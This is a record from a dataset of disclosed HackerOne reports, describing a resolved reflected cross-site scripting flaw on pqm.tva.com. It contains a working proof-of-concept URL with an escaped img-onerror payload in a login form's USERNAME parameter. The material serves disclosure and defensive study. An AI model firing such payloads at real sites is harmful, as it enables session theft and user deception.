---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1363001'
original_report_id: '1363001'
title: xss reflected - pqm.tva.com
weakness: Cross-site Scripting (XSS) - Reflected
team_handle: tennessee-valley-authority
created_at: '2021-10-07T17:21:05.394Z'
disclosed_at: '2023-10-13T12:31:49.078Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 12
asset_identifier: '*.tva.com'
asset_type: WILDCARD
max_severity: critical
tags:
- hackerone
- cross-site-scripting-xss-reflected
---

# xss reflected - pqm.tva.com

## Metadata

- HackerOne Report ID: 1363001
- Weakness: Cross-site Scripting (XSS) - Reflected
- Program: tennessee-valley-authority
- Disclosed At: 2023-10-13T12:31:49.078Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

POC:

https://pqm.tva.com/siteminderagent/forms/smpwservices.fcc?USERNAME=\u003cimg\u0020src\u003dx\u0020onerror\u003d\u0022confirm(document.domain)\u0022\u003e&SMAUTHREASON=7

## Impact

With the help of xss a hacker or attacker can perform social engineering on users by redirecting them from real website to fake one. hacker can steal their cookies and download a malware on their system, and there are many more attacking scenarios a skilled attacker can perform with xss.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
